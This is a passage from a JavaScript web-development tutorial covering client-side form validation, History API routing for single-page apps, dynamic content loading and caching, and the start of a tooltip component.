    if (customMessage) return customMessage;

    const defaultMessages = {
        required: `${fieldLabel} is required`,
        minLength: `${fieldLabel} must be at least ${param} characters`,
        maxLength: `${fieldLabel} cannot exceed ${param} characters`,
        pattern: `${fieldLabel} has an invalid format`,
    };

    return defaultMessages[type] || 'Invalid value';
}

getFieldLabel(input) {
    const label = this.form.querySelector(
        `label[for="${input.id}"]`
    );

    return (
        label?.textContent.replace('*', '').trim() || input.name
    );
}

focusFirstError() {
    const firstInvalid = this.form.querySelector(
        '[aria-invalid="true"]'
    );

    if (firstInvalid) {
        firstInvalid.focus();
        firstInvalid.scrollIntoView({
            behavior: 'smooth',
            block: 'center',
        });
    }
}

showLoadingIndicator(input) {
    input.classList.add('validating');
}

hideLoadingIndicator(input) {
    input.classList.remove('validating');
}

reset() {
    this.fieldStates.clear();
    this.touched.clear();
    this.validationCache.clear();

    this.form
        .querySelectorAll('input, select, textarea')
        .forEach(input => {
            input.classList.remove(
                'valid',
                'invalid',
                'validating'
            );
            input.removeAttribute('aria-invalid');
            input.removeAttribute('aria-describedby');

            const errorElement = this.getErrorElement(input);
            errorElement.textContent = '';
            errorElement.style.display = 'none';
        });
}

// Usage
const validator = new ComprehensiveFormValidator(
    document.getElementById('my-form'),
    {
        rules: {
            username: {
                required: true,
                minLength: 3,
                maxLength: 20,
                pattern: /^[a-zA-Z0-9_]+$/,
                custom: async value => {
                    const response = await fetch(
                        `/api/check-username/${value}`
                    );
                    const result = await response.json();
                    return (
                        result.available ||
                        'Username already taken'
                    );
                },
            },
            email: {
                required: true,
                pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
            },
            password: {
                required: true,
                minLength: 8,
                custom: value => {
                    if (!/[A-Z]/.test(value))
                        return 'Must contain uppercase letter';
                    if (!/[a-z]/.test(value))
                        return 'Must contain lowercase letter';
                    if (!/[0-9]/.test(value))
                        return 'Must contain number';
                    return true;
                },
            },
        },
        messages: {
            email: {
                pattern: 'Please enter a valid email address',
            },
        },
    }
);
```


This validation system provides comprehensive client-side form validation with proper error handling, accessibility support, and extensibility for various validation requirements.

---

## Single-Page Navigation

### History API Methods

**`history.pushState(state, title, url)`** adds a new entry to the browser's session history stack without triggering a page reload. The `state` parameter is an object associated with the history entry, `title` is largely ignored by browsers, and `url` is the new URL to display (must be same-origin).

```javascript
history.pushState(
  { page: 'about', data: { userId: 123 } },
  '',
  '/about'
);
```

**`history.replaceState(state, title, url)`** modifies the current history entry instead of adding a new one. Useful when you want to update the URL or state without creating a back button entry.

```javascript
// Update URL without adding history entry
history.replaceState(
  { ...history.state, scrollY: window.scrollY },
  '',
  window.location.pathname
);
```

**`history.back()`**, **`history.forward()`**, and **`history.go(delta)`** navigate through history. `go()` accepts negative values for backward navigation, positive for forward, or 0 to reload.

```javascript
history.back();        // Same as browser back button
history.go(-2);        // Go back 2 entries
history.go(0);         // Reload current page
```

**`history.state`** returns the state object of the current history entry. Returns `null` if no state was set.

```javascript
const currentState = history.state;
console.log(currentState?.page, currentState?.data);
```

**`history.length`** returns the number of entries in the session history stack.

### Navigation Events

**`popstate` event** fires when the active history entry changes due to user navigation (back/forward buttons) or programmatic calls to `history.back()`, `history.forward()`, or `history.go()`. Does NOT fire for `pushState()` or `replaceState()`.

```javascript
window.addEventListener('popstate', (event) => {
  console.log('State:', event.state);
  console.log('URL:', location.pathname);
  
  // Route based on new URL
  if (event.state?.page) {
    loadPage(event.state.page);
  }
});
```

**`hashchange` event** fires when the URL's fragment identifier changes. Occurs before `popstate` when hash changes.

```javascript
window.addEventListener('hashchange', (event) => {
  console.log('Old URL:', event.oldURL);
  console.log('New URL:', event.newURL);
  console.log('Hash:', location.hash);
});
```

### URL Manipulation

**`location.pathname`**, **`location.search`**, **`location.hash`** provide read/write access to URL components. Writing to these properties triggers navigation.

```javascript
// Read current path
const currentPath = location.pathname;

// Navigate by changing pathname (triggers page reload)
location.pathname = '/new-page';

// Work with URLSearchParams
const params = new URLSearchParams(location.search);
params.set('filter', 'active');
history.pushState(null, '', `?${params}`);
```

**`URL` constructor** parses and manipulates URLs without affecting the current page.

```javascript
const url = new URL('/products', location.origin);
url.searchParams.set('category', 'electronics');
url.searchParams.set('sort', 'price');

history.pushState({ category: 'electronics' }, '', url);
```

### Router Pattern Implementation

```javascript
class Router {
  constructor() {
    this.routes = new Map();
    this.currentRoute = null;
    
    window.addEventListener('popstate', (e) => {
      this.handleRoute(location.pathname, e.state);
    });
    
    // Handle initial load
    this.handleRoute(location.pathname, history.state);
  }
  
  addRoute(path, handler) {
    this.routes.set(path, handler);
  }
  
  navigate(path, state = {}) {
    history.pushState(state, '', path);
    this.handleRoute(path, state);
  }
  
  handleRoute(path, state) {
    const handler = this.routes.get(path);
    if (handler) {
      this.currentRoute = path;
      handler(state);
    } else {
      this.handle404(path);
    }
  }
  
  handle404(path) {
    console.log('Route not found:', path);
  }
}

// Usage
const router = new Router();
router.addRoute('/home', (state) => {
  document.getElementById('content').innerHTML = '<h1>Home</h1>';
});
router.addRoute('/about', (state) => {
  document.getElementById('content').innerHTML = '<h1>About</h1>';
});

// Navigate
router.navigate('/home');
```

### Link Interception

Intercepting anchor clicks to prevent default navigation and handle routing client-side:

```javascript
document.addEventListener('click', (e) => {
  const link = e.target.closest('a[href]');
  
  if (!link) return;
  
  const href = link.getAttribute('href');
  
  // Check if same-origin and not external
  if (href.startsWith('/') || href.startsWith(location.origin)) {
    e.preventDefault();
    
    const url = new URL(href, location.origin);
    history.pushState(
      { timestamp: Date.now() },
      '',
      url.pathname + url.search + url.hash
    );
    
    // Trigger route handling
    handleRoute(url.pathname);
  }
});
```

### Path Pattern Matching

```javascript
class PathMatcher {
  constructor(pattern) {
    this.paramNames = [];
    this.regex = this.createRegex(pattern);
  }
  
  createRegex(pattern) {
    const regexString = pattern
      .replace(/:\w+/g, (match) => {
        this.paramNames.push(match.slice(1));
        return '([^/]+)';
      })
      .replace(/\*/g, '.*');
    
    return new RegExp(`^${regexString}$`);
  }
  
  match(path) {
    const matches = path.match(this.regex);
    if (!matches) return null;
    
    const params = {};
    this.paramNames.forEach((name, index) => {
      params[name] = matches[index + 1];
    });
    
    return params;
  }
}

// Usage
const matcher = new PathMatcher('/users/:id/posts/:postId');
const params = matcher.match('/users/123/posts/456');
// Returns: { id: '123', postId: '456' }
```

### Query Parameter Management

```javascript
class QueryParams {
  constructor(search = location.search) {
    this.params = new URLSearchParams(search);
  }
  
  get(key) {
    return this.params.get(key);
  }
  
  getAll(key) {
    return this.params.getAll(key);
  }
  
  set(key, value) {
    this.params.set(key, value);
    return this;
  }
  
  delete(key) {
    this.params.delete(key);
    return this;
  }
  
  has(key) {
    return this.params.has(key);
  }
  
  apply(method = 'push') {
    const url = `${location.pathname}?${this.params}`;
    if (method === 'push') {
      history.pushState(null, '', url);
    } else {
      history.replaceState(null, '', url);
    }
  }
  
  toObject() {
    const obj = {};
    this.params.forEach((value, key) => {
      if (obj[key]) {
        obj[key] = Array.isArray(obj[key]) ? [...obj[key], value] : [obj[key], value];
      } else {
        obj[key] = value;
      }
    });
    return obj;
  }
}

// Usage
const query = new QueryParams();
query.set('page', '2').set('sort', 'date').apply('replace');
```

### Scroll Restoration

**`history.scrollRestoration`** controls whether the browser automatically restores scroll position on navigation. Values: `'auto'` (default) or `'manual'`.

```javascript
// Disable automatic scroll restoration
history.scrollRestoration = 'manual';

// Manual scroll management
const scrollPositions = new Map();

window.addEventListener('popstate', (e) => {
  const key = location.pathname;
  
  // Restore scroll position after content loads
  requestAnimationFrame(() => {
    const position = scrollPositions.get(key) || 0;
    window.scrollTo(0, position);
  });
});

// Save scroll position before navigation
function navigateToRoute(path) {
  scrollPositions.set(location.pathname, window.scrollY);
  history.pushState(null, '', path);
  handleRoute(path);
}
```

### State Persistence Strategies

```javascript
// Store complex state with navigation
function navigateWithState(path, appState) {
  const state = {
    timestamp: Date.now(),
    path: path,
    data: appState,
    scrollY: window.scrollY
  };
  
  history.pushState(state, '', path);
  
  // Also persist to sessionStorage for page reloads
  sessionStorage.setItem(`state_${path}`, JSON.stringify(appState));
}

// Restore state on popstate
window.addEventListener('popstate', (e) => {
  if (e.state?.data) {
    restoreAppState(e.state.data);
  } else {
    // Fallback to sessionStorage if state not available
    const stored = sessionStorage.getItem(`state_${location.pathname}`);
    if (stored) {
      restoreAppState(JSON.parse(stored));
    }
  }
});
```

### Hash-Based Navigation

```javascript
// Parse hash routes
function parseHash() {
  const hash = location.hash.slice(1); // Remove #
  const [path, search] = hash.split('?');
  const params = new URLSearchParams(search);
  
  return { path, params };
}

// Hash router
const hashRouter = {
  routes: new Map(),
  
  init() {
    window.addEventListener('hashchange', () => {
      this.handleRoute();
    });
    this.handleRoute();
  },
  
  handleRoute() {
    const { path, params } = parseHash();
    const handler = this.routes.get(path);
    
    if (handler) {
      handler(Object.fromEntries(params));
    }
  },
  
  navigate(path, params = {}) {
    const search = new URLSearchParams(params).toString();
    location.hash = search ? `${path}?${search}` : path;
  }
};

// Usage
hashRouter.routes.set('/home', (params) => {
  console.log('Home route', params);
});
hashRouter.init();
hashRouter.navigate('/home', { tab: 'settings' });
```

### Navigation Guards

```javascript
class GuardedRouter {
  constructor() {
    this.routes = new Map();
    this.beforeNavigate = [];
    this.afterNavigate = [];
    this.currentPath = null;
  }
  
  addGuard(phase, callback) {
    this[phase].push(callback);
  }
  
  async navigate(path, state = {}) {
    // Run before guards
    for (const guard of this.beforeNavigate) {
      const result = await guard(path, this.currentPath);
      if (result === false) {
        console.log('Navigation cancelled by guard');
        return false;
      }
    }
    
    // Perform navigation
    history.pushState(state, '', path);
    this.currentPath = path;
    
    const handler = this.routes.get(path);
    if (handler) {
      await handler(state);
    }
    
    // Run after guards
    for (const guard of this.afterNavigate) {
      await guard(path);
    }
    
    return true;
  }
}

// Usage
const router = new GuardedRouter();

router.addGuard('beforeNavigate', async (to, from) => {
  if (hasUnsavedChanges()) {
    return confirm('You have unsaved changes. Leave anyway?');
  }
  return true;
});

router.addGuard('afterNavigate', async (path) => {
  // Track page views
  analytics.track('pageview', { path });
  
  // Scroll to top
  window.scrollTo(0, 0);
});
```

### Prefetching Strategy

```javascript
// Prefetch routes on hover
function setupPrefetch() {
  const prefetched = new Set();
  
  document.addEventListener('mouseover', (e) => {
    const link = e.target.closest('a[href]');
    if (!link) return;
    
    const href = link.getAttribute('href');
    if (prefetched.has(href)) return;
    
    if (href.startsWith('/')) {
      prefetched.add(href);
      
      // Prefetch data for route
      fetch(`/api/data?path=${href}`)
        .then(res => res.json())
        .then(data => {
          // Cache data
          routeDataCache.set(href, data);
        });
    }
  });
}
```

### Nested Routes

```javascript
class NestedRouter {
  constructor() {
    this.routes = [];
  }
  
  addRoute(pattern, handler, children = []) {
    this.routes.push({
      matcher: new PathMatcher(pattern),
      handler,
      children
    });
  }
  
  match(path) {
    const segments = path.split('/').filter(Boolean);
    return this.matchSegments(segments, this.routes);
  }
  
  matchSegments(segments, routes, params = {}, matched = []) {
    if (segments.length === 0) return { matched, params };
    
    const currentPath = '/' + segments.join('/');
    
    for (const route of routes) {
      const routeParams = route.matcher.match(currentPath);
      
      if (routeParams) {
        matched.push(route);
        return {
          matched,
          params: { ...params, ...routeParams }
        };
      }
      
      // Try partial match for nested routes
      if (route.children.length > 0) {
        const partialPath = '/' + segments[0];
        const partialParams = route.matcher.match(partialPath);
        
        if (partialParams) {
          const result = this.matchSegments(
            segments.slice(1),
            route.children,
            { ...params, ...partialParams },
            [...matched, route]
          );
          if (result) return result;
        }
      }
    }
    
    return null;
  }
  
  async render(path) {
    const match = this.match(path);
    
    if (!match) {
      console.log('No route matched');
      return;
    }
    
    // Render each level
    for (const route of match.matched) {
      await route.handler(match.params);
    }
  }
}
```

### Navigation Timing

```javascript
class NavigationTimer {
  constructor() {
    this.timings = new Map();
  }
  
  start(id) {
    this.timings.set(id, {
      start: performance.now(),
      marks: []
    });
  }
  
  mark(id, label) {
    const timing = this.timings.get(id);
    if (timing) {
      timing.marks.push({
        label,
        time: performance.now() - timing.start
      });
    }
  }
  
  end(id) {
    const timing = this.timings.get(id);
    if (timing) {
      timing.duration = performance.now() - timing.start;
      console.log(`Navigation ${id}:`, timing);
      return timing;
    }
  }
}

// Usage
const navTimer = new NavigationTimer();

function navigate(path) {
  const id = `nav_${Date.now()}`;
  navTimer.start(id);
  
  history.pushState(null, '', path);
  navTimer.mark(id, 'history_updated');
  
  fetchRouteData(path).then(data => {
    navTimer.mark(id, 'data_loaded');
    renderRoute(data);
    navTimer.mark(id, 'render_complete');
    navTimer.end(id);
  });
}
```

### Focus Management

```javascript
function handleRouteChange(path) {
  // Announce route change to screen readers
  announceRouteChange(path);
  
  // Focus management
  const main = document.querySelector('main');
  if (main) {
    // Make focusable temporarily
    main.setAttribute('tabindex', '-1');
    main.focus();
    
    // Remove after focus
    main.addEventListener('blur', () => {
      main.removeAttribute('tabindex');
    }, { once: true });
  }
}

function announceRouteChange(path) {
  const announcer = document.getElementById('route-announcer') || 
    createAnnouncer();
  
  announcer.textContent = `Navigated to ${getPageTitle(path)}`;
}

function createAnnouncer() {
  const div = document.createElement('div');
  div.id = 'route-announcer';
  div.setAttribute('role', 'status');
  div.setAttribute('aria-live', 'polite');
  div.setAttribute('aria-atomic', 'true');
  div.style.cssText = 'position:absolute;left:-10000px;width:1px;height:1px;overflow:hidden;';
  document.body.appendChild(div);
  return div;
}
```

### Memory Leak Prevention

```javascript
class RouterWithCleanup {
  constructor() {
    this.currentCleanup = null;
    this.abortController = null;
  }
  
  async navigate(path) {
    // Cancel ongoing requests
    if (this.abortController) {
      this.abortController.abort();
    }
    this.abortController = new AbortController();
    
    // Run cleanup from previous route
    if (this.currentCleanup) {
      this.currentCleanup();
      this.currentCleanup = null;
    }
    
    history.pushState(null, '', path);
    
    // Load new route
    const cleanup = await this.loadRoute(path, this.abortController.signal);
    this.currentCleanup = cleanup;
  }
  
  async loadRoute(path, signal) {
    const response = await fetch(`/api${path}`, { signal });
    const data = await response.json();
    
    const eventListeners = [];
    
    // Render with tracked listeners
    const addTrackedListener = (element, event, handler) => {
      element.addEventListener(event, handler);
      eventListeners.push({ element, event, handler });
    };
    
    render(data, addTrackedListener);
    
    // Return cleanup function
    return () => {
      eventListeners.forEach(({ element, event, handler }) => {
        element.removeEventListener(event, handler);
      });
      eventListeners.length = 0;
    };
  }
}
```

[Inference: The specific performance characteristics of different routing implementations depend on application complexity, but cleanup patterns are generally necessary to prevent memory leaks in long-running SPAs]

---

## Dynamic Content Loading

### Loading Patterns and Mechanisms

**Lazy Loading** Content loads only when needed, typically triggered by user proximity or interaction. Images, components, and route modules defer loading until viewport intersection, scroll position thresholds, or explicit user actions occur. Intersection Observer API provides efficient viewport detection without scroll event handlers.

**Infinite Scroll** Content appends continuously as users approach the bottom of existing content. Implementations monitor scroll position or use Intersection Observer on sentinel elements placed near content boundaries. The pattern eliminates pagination UI but requires careful memory management as DOM nodes accumulate.

**Pagination** Discrete content chunks load on explicit navigation. Server-side pagination returns specific page ranges, while client-side pagination pre-loads full datasets then displays subsets. Hybrid approaches combine both, loading several pages ahead while maintaining page boundaries.

**Progressive Loading** Content arrives in prioritized stages. Critical above-the-fold content loads first, followed by secondary content, then tertiary assets. Image progressive rendering displays low-resolution placeholders before full-quality versions. Component shells render before data populates them.

**On-Demand Loading** Content loads in response to specific user interactions—tab switches, accordion expansions, modal opens. This pattern minimizes initial payload but introduces latency during interactions unless preloading strategies anticipate likely user paths.

### Implementation Techniques

**Fetch API Patterns**

```javascript
async function loadContent(url, options = {}) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), options.timeout || 5000);
  
  try {
    const response = await fetch(url, {
      signal: controller.signal,
      ...options
    });
    clearTimeout(timeoutId);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    return await response.json();
  } catch (error) {
    if (error.name === 'AbortError') {
      throw new Error('Request timeout');
    }
    throw error;
  }
}
```

Abort controllers enable request cancellation when users navigate away or when components unmount. This prevents memory leaks and racing conditions where stale responses overwrite current content.

**Intersection Observer Implementation**

```javascript
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      loadContentForElement(entry.target);
      observer.unobserve(entry.target);
    }
  });
}, {
  rootMargin: '50px',
  threshold: 0.1
});
```

Root margin creates a buffer zone around the viewport, triggering loads before elements become visible. Threshold determines what percentage of the element must be visible before triggering. Unobserving after loading prevents redundant triggers.

**Virtual Scrolling** Only DOM nodes for visible items exist at any time. As users scroll, nodes for items leaving the viewport are recycled and updated with data for items entering. This maintains constant DOM size regardless of total dataset size.

The viewport container has absolute positioning with calculated height representing full content. Individual items position absolutely at calculated offsets. Scroll events or Intersection Observers determine which items should render.

**Skeleton Screens** Placeholder UI matching final content layout renders immediately. CSS or SVG creates gray rectangles, circles, or waves suggesting content structure. This provides immediate feedback and reduces perceived loading time compared to blank spaces or spinners.

### Data Fetching Strategies

**Prefetching** Resources load before users request them based on predicted navigation. Link prefetching loads pages for likely next clicks. Route prefetching loads code chunks for probable navigation targets. Data prefetching loads content for anticipated interactions.

```javascript
// Link prefetch
<link rel="prefetch" href="/next-page.html">

// Programmatic prefetch
const link = document.createElement('link');
link.rel = 'prefetch';
link.href = dataUrl;
document.head.appendChild(link);
```

**[Inference]** Prefetching increases bandwidth usage for resources that may never be used, but reduces latency when predictions are accurate.

**Request Batching** Multiple data requests combine into single network calls. GraphQL queries bundle multiple resource requests. REST API batch endpoints accept arrays of resource identifiers. This reduces connection overhead and enables server-side optimization.

**Request Deduplication** Identical simultaneous requests return the same promise. When multiple components request identical data concurrently, only one network request executes. Subsequent requests await the original promise.

```javascript
const pendingRequests = new Map();

async function deduplicatedFetch(url) {
  if (pendingRequests.has(url)) {
    return pendingRequests.get(url);
  }
  
  const promise = fetch(url).then(r => r.json());
  pendingRequests.set(url, promise);
  
  try {
    return await promise;
  } finally {
    pendingRequests.delete(url);
  }
}
```

**Polling** Periodic requests check for content updates. Short intervals provide near-real-time updates but increase server load. Long intervals reduce load but delay updates. Exponential backoff increases intervals when no changes occur, resetting to short intervals after changes.

**Server-Sent Events (SSE)** Server pushes updates through persistent HTTP connections. The client maintains an EventSource connection receiving text-based messages. This provides one-way real-time updates without WebSocket complexity.

**WebSocket Streaming** Bidirectional persistent connections enable full-duplex communication. Servers push updates immediately without polling. Clients send requests without establishing new connections. This pattern suits real-time collaborative applications, live feeds, and chat interfaces.

### Caching and State Management

**Memory Caching** Loaded content persists in JavaScript memory structures (Maps, Objects, WeakMaps). Subsequent requests return cached data immediately. Memory constraints limit cache size, requiring eviction policies—LRU (least recently used), LFU (least frequently used), or TTL (time-to-live) based.

**HTTP Caching** Cache-Control headers direct browser cache behavior. `max-age` specifies freshness duration. `no-cache` forces revalidation. `private` restricts caching to browsers. `public` allows CDN caching. ETag and Last-Modified headers enable conditional requests returning 304 Not Modified responses when content hasn't changed.

**Service Worker Caching** Service workers intercept network requests, implementing custom caching strategies:

- **Cache First**: Return cached content, fetch only on cache miss
- **Network First**: Attempt fetch, fallback to cache on failure
- **Stale While Revalidate**: Return cached content immediately, fetch update in background
- **Network Only**: Always fetch, never cache (dynamic personalized content)
- **Cache Only**: Offline-first applications with pre-cached content

**IndexedDB Storage** Structured data persists in browser databases. This enables offline-first applications and large dataset caching beyond LocalStorage's 5-10MB limits. IndexedDB supports indexes, transactions, and asynchronous operations.

### Performance Optimization

**Resource Hints**

```javascript
// DNS prefetch - resolve domain early
<link rel="dns-prefetch" href="//api.example.com">

// Preconnect - establish connection early  
<link rel="preconnect" href="//cdn.example.com">

// Preload - fetch critical resource immediately
<link rel="preload" href="/critical.css" as="style">
```

These hints inform browsers about upcoming resource needs, reducing latency by performing preparatory work during idle time.

**Priority Hints** The `fetchpriority` attribute influences browser resource prioritization:

```javascript
<img src="hero.jpg" fetchpriority="high">
<img src="thumbnail.jpg" fetchpriority="low">
```

**[Unverified]** Browser support and actual prioritization behavior varies across implementations.

**Code Splitting** JavaScript bundles split into chunks loading separately. Route-based splitting loads code for each route independently. Component-based splitting defers non-critical component code. Vendor splitting separates third-party libraries from application code.

Webpack, Rollup, and Vite support dynamic imports:

```javascript
const module = await import('./heavy-component.js');
```

Bundlers automatically split code at import boundaries, creating separate chunks.

**Image Optimization** Responsive images serve appropriate resolutions using `srcset` and `sizes` attributes. Modern formats (WebP, AVIF) provide better compression than JPEG/PNG. CDNs with image processing transform images on-demand based on request parameters.

```javascript
<img 
  srcset="image-320w.jpg 320w,
          image-640w.jpg 640w,
          image-1280w.jpg 1280w"
  sizes="(max-width: 640px) 100vw, 640px"
  src="image-640w.jpg">
```

**Compression** Gzip and Brotli compress text-based resources. Brotli achieves 15-20% better compression than Gzip but requires more CPU. Servers send compressed versions based on Accept-Encoding headers.

### Error Handling and Resilience

**Retry Strategies** Failed requests retry with exponential backoff. Initial retry occurs immediately, subsequent retries double the delay. Maximum retry counts prevent infinite loops. Idempotent requests (GET) retry safely; non-idempotent requests (POST) require careful consideration.

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  
  for (let i = 0; i <= maxRetries; i++) {
    try {
      return await fetch(url, options);
    } catch (error) {
      lastError = error;
      if (i < maxRetries) {
        await new Promise(resolve => 
          setTimeout(resolve, Math.pow(2, i) * 1000)
        );
      }
    }
  }
  
  throw lastError;
}
```

**Fallback Content** When loading fails, applications display cached stale content, placeholder content, or error messages with retry options. Progressive enhancement ensures core functionality works even when dynamic loading fails.

**Circuit Breaker Pattern** After consecutive failures reach a threshold, the circuit "opens," immediately failing requests without attempting them. After a timeout, the circuit enters "half-open" state, allowing test requests. Success closes the circuit; failure reopens it.

This prevents cascading failures and reduces load on struggling services.

**Loading States** UI reflects loading progression through distinct states:

- **Idle**: No loading activity
- **Loading**: Request in progress
- **Success**: Content loaded successfully
- **Error**: Loading failed with error details

Transitions between states drive UI updates—showing spinners, disabling interactions, displaying content, or rendering error messages.

### Memory Management

**Content Unloading** Long-lived dynamic applications must remove content as users scroll past or navigate away. DOM node removal alone doesn't free memory if JavaScript references persist. Event listeners, timers, and observers require explicit cleanup.

```javascript
function cleanup(element) {
  // Remove event listeners
  element.replaceWith(element.cloneNode(true));
  
  // Disconnect observers
  observer.disconnect();
  
  // Clear timers
  clearInterval(intervalId);
  
  // Remove from cache
  cache.delete(elementId);
}
```

**Weak References** WeakMap and WeakSet allow garbage collection of entries when keys become unreachable elsewhere. This enables caching without preventing cleanup.

```javascript
const elementCache = new WeakMap();

function cacheData(element, data) {
  elementCache.set(element, data);
  // When element is removed from DOM and no other references exist,
  // this cache entry becomes eligible for garbage collection
}
```

**Virtual List Recycling** Virtual scrolling implementations recycle DOM nodes rather than creating/destroying them. A pool of nodes updates with new data as scroll position changes. This eliminates allocation/deallocation overhead.

### Security Considerations

**Content Security Policy (CSP)** CSP headers restrict dynamic content sources. `default-src` defines allowed origins. `script-src` controls JavaScript sources. `connect-src` restricts fetch/XHR destinations. Violations log to console or report to specified endpoints.

```javascript
Content-Security-Policy: 
  default-src 'self'; 
  connect-src 'self' https://api.example.com;
  img-src 'self' https://cdn.example.com;
```

**CORS Configuration** Cross-Origin Resource Sharing headers control which origins can access resources. `Access-Control-Allow-Origin` specifies allowed origins. `Access-Control-Allow-Credentials` permits cookie inclusion. Preflight requests (OPTIONS) verify permissions before actual requests.

**Data Sanitization** Dynamically loaded HTML requires sanitization before DOM insertion. DOMPurify and similar libraries remove script tags, event handlers, and dangerous attributes. `textContent` assignment is safe; `innerHTML` assignment requires sanitization.

**Authentication Tokens** Bearer tokens in Authorization headers authenticate API requests. Tokens stored in memory (not LocalStorage) reduce XSS exposure. HttpOnly cookies prevent JavaScript access. Short-lived access tokens with refresh token rotation minimize compromise windows.

### Framework-Specific Implementations

**React Patterns**

```javascript
function InfiniteList() {
  const [items, setItems] = useState([]);
  const [page, setPage] = useState(0);
  const [loading, setLoading] = useState(false);
  const observerRef = useRef();
  
  const lastItemRef = useCallback(node => {
    if (loading) return;
    if (observerRef.current) observerRef.current.disconnect();
    
    observerRef.current = new IntersectionObserver(entries => {
      if (entries[0].isIntersecting) {
        setPage(prev => prev + 1);
      }
    });
    
    if (node) observerRef.current.observe(node);
  }, [loading]);
  
  useEffect(() => {
    setLoading(true);
    fetchPage(page)
      .then(newItems => setItems(prev => [...prev, ...newItems]))
      .finally(() => setLoading(false));
  }, [page]);
  
  return (
    <>
      {items.map((item, i) => (
        <div 
          key={item.id}
          ref={i === items.length - 1 ? lastItemRef : null}
        >
          {item.content}
        </div>
      ))}
      {loading && <Spinner />}
    </>
  );
}
```

React.lazy() and Suspense enable component-level code splitting:

```javascript
const HeavyComponent = React.lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<Spinner />}>
      <HeavyComponent />
    </Suspense>
  );
}
```

**Vue Patterns** Vue's defineAsyncComponent enables lazy component loading:

```javascript
const AsyncComponent = defineAsyncComponent({
  loader: () => import('./Component.vue'),
  loadingComponent: LoadingSpinner,
  errorComponent: ErrorDisplay,
  delay: 200,
  timeout: 3000
});
```

Vue Router supports route-level code splitting:

```javascript
const routes = [
  {
    path: '/dashboard',
    component: () => import('./Dashboard.vue')
  }
];
```

**Angular Patterns** Angular's lazy loading operates at module level:

```javascript
const routes: Routes = [
  {
    path: 'admin',
    loadChildren: () => import('./admin/admin.module')
      .then(m => m.AdminModule)
  }
];
```

Angular's HttpClient includes built-in interceptor support for authentication, caching, and error handling.

### Accessibility Considerations

**Loading Announcements** Screen readers require ARIA live regions announcing loading state changes:

```javascript
<div role="status" aria-live="polite" aria-atomic="true">
  {loading ? "Loading content..." : ""}
</div>
```

**Focus Management** After content loads, focus should move logically. New content appearing above viewport shouldn't steal focus. Content replacing current focus target should move focus to equivalent new element.

**Keyboard Navigation** Loading triggers (infinite scroll sentinels, load-more buttons) must be keyboard accessible. Focus indicators must remain visible. Skip links allow bypassing long dynamically loaded lists.

**Loading Indicators** Multiple concurrent loading operations should have distinct indicators clarifying what's loading. Generic spinners without context create confusion. Status text provides screen reader users equivalent information.

---

## Tooltip System

### Core Architecture

#### Basic Tooltip Structure

A tooltip system requires positioning logic, visibility management, and DOM manipulation.

```javascript
class Tooltip {
  constructor(options = {}) {
    this.options = {
      placement: 'top',
      offset: 8,
      delay: 200,
      hideDelay: 0,
      arrow: true,
      trigger: 'hover',
      interactive: false,
      maxWidth: 300,
      className: '',
      animation: 'fade',
      ...options
    };
    
    this.tooltip = null;
    this.arrow = null;
    this.trigger = null;
    this.showTimeout = null;
    this.hideTimeout = null;
    this.isVisible = false;
    this.isDestroyed = false;
  }
  
  create(triggerElement, content) {
    this.trigger = triggerElement;
    
    // Create tooltip element
    this.tooltip = document.createElement('div');
    this.tooltip.className = `tooltip ${this.options.className}`;
    this.tooltip.setAttribute('role', 'tooltip');
    this.tooltip.style.position = 'absolute';
    this.tooltip.style.maxWidth = `${this.options.maxWidth}px`;
    
    // Set content
    if (typeof content === 'string') {
      this.tooltip.textContent = content;
    } else if (content instanceof HTMLElement) {
      this.tooltip.appendChild(content);
    }
    
    // Create arrow
    if (this.options.arrow) {
      this.arrow = document.createElement('div');
      this.arrow.className = 'tooltip-arrow';
      this.tooltip.appendChild(this.arrow);
    }
    
    // Attach event listeners
    this.attachListeners();
    
    // Generate unique IDs for accessibility
    const tooltipId = `tooltip-${Math.random().toString(36).substr(2, 9)}`;
    this.tooltip.id = tooltipId;
    this.trigger.setAttribute('aria-describedby', tooltipId);
    
    return this;
  }
  
  attachListeners() {
    const { trigger, interactive } = this.options;
    
    if (trigger === 'hover') {
      this.trigger.addEventListener('mouseenter', this.handleMouseEnter);
      this.trigger.addEventListener('mouseleave', this.handleMouseLeave);
      this.trigger.addEventListener('focus', this.handleFocus);
      this.trigger.addEventListener('blur', this.handleBlur);
      
      if (interactive) {
        this.tooltip.addEventListener('mouseenter', this.handleTooltipMouseEnter);
        this.tooltip.addEventListener('mouseleave', this.handleTooltipMouseLeave);
      }
    } else if (trigger === 'click') {
      this.trigger.addEventListener('click', this.handleClick);
    } else if (trigger === 'focus') {
      this.trigger.addEventListener('focus', this.handleFocus);
      this.trigger.addEventListener('blur', this.handleBlur);
    }
  }
  
  handleMouseEnter = () => {
    clearTimeout(this.hideTimeout);
    this.showTimeout = setTimeout(() => {
      this.show();
    }, this.options.delay);
  };
  
  handleMouseLeave = () => {
    clearTimeout(this.showTimeout);
    if (!this.options.interactive) {
      this.hideTimeout = setTimeout(() => {
        this.hide();
      }, this.options.hideDelay);
    }
  };
  
  handleTooltipMouseEnter = () => {
    clearTimeout(this.hideTimeout);
  };
  
  handleTooltipMouseLeave = () => {
    this.hideTimeout = setTimeout(() => {
      this.hide();
    }, this.options.hideDelay);
  };
  
  handleFocus = () => {
    this.show();
  };
  
  handleBlur = () => {
    this.hide();
  };
  
  handleClick = (e) => {
    e.stopPropagation();
    this.toggle();
  };
  
  show() {
    if (this.isVisible || this.isDestroyed) return;
    
    document.body.appendChild(this.tooltip);
    this.position();
    
    // Trigger reflow for animation
    this.tooltip.offsetHeight;
    
    this.tooltip.classList.add('tooltip-visible');
    this.isVisible = true;
    
    // Listen for scroll/resize
    window.addEventListener('scroll', this.handleScroll, true);
    window.addEventListener('resize', this.handleResize);
    
    this.trigger.dispatchEvent(new CustomEvent('tooltip:show'));
  }
  
  hide() {
    if (!this.isVisible) return;
    
    this.tooltip.classList.remove('tooltip-visible');
    
    const duration = parseFloat(getComputedStyle(this.tooltip).transitionDuration) * 1000;
    
    setTimeout(() => {
      if (this.tooltip?.parentNode) {
        this.tooltip.parentNode.removeChild(this.tooltip);
      }
      this.isVisible = false;
    }, duration || 0);
    
